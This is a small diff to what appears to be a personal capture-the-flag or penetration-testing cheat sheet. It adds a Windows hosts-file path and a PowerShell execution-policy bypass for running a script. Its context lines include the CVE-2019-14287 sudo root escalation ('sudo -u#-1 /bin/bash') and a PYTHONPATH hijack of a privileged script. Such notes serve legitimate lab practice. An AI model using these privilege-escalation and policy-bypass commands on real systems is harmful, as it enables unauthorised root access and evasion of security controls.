@@ -43,6 +43,9 @@ Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "`n10.10.218.14
 ---------------------------------------------------------------------
 sudo -u#-1 /bin/bash # CVE-2019-14287 
 ---------------------------------------------------------------------
+C:\Windows\System32\drivers\etc\hosts # /etc/hosts
+powershell.exe -exec Bypass -File '.\a541a.ps1' # run ps1 file in windows
+---------------------------------------------------------------------
 sudo -u silvio /usr/bin/zip # run with another user
 sudo -u jordan PYTHONPATH=/tmp /opt/scripts/flag.py # run with PYTHONPATH 
 
